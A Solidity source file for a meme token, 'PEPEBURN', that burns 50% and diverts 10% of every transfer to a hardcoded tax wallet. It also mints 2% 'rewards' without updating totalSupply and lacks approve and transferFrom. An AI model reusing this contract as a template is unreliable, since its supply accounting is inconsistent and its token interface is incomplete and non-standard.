// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract PEPEBURN {
    string public name = "PEPEBURN";
    string public symbol = "BPOV";
    uint256 public totalSupply = 2000000000000000000000000000000;
    uint8 public decimals = 18;

    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
    address public taxAddress = 0xDFCcc0E53f553Ea9e0b5fCC9e67c5F70d5ebDAbf;
    uint256 public burnPercent = 50;
    uint256 public taxPercent = 10;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public rewards;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint256 value) external returns (bool success) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        uint256 taxAmount = value * taxPercent / 100;
        uint256 burnAmount = value * burnPercent / 100;
        uint256 transferAmount = value - taxAmount - burnAmount;
        balanceOf[msg.sender] -= value;
        balanceOf[to] += transferAmount;
        balanceOf[burnAddress] += burnAmount;
        balanceOf[taxAddress] += taxAmount;
        emit Transfer(msg.sender, to, transferAmount);
        emit Transfer(msg.sender, burnAddress, burnAmount);
        emit Transfer(msg.sender, taxAddress, taxAmount);
        rewards[msg.sender] += value * 2 / 100;
        return true;
    }

    function claimRewards() external {
        uint256 reward = rewards[msg.sender];
        require(reward > 0, "No rewards to claim");
        rewards[msg.sender] = 0;
        balanceOf[msg.sender] += reward;
        emit Transfer(address(0), msg.sender, reward);
    }

    function renounceOwnership() external {
        require(msg.sender == owner, "Not the owner");
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender == owner, "Not the owner");
        require(newOwner != address(0), "Zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}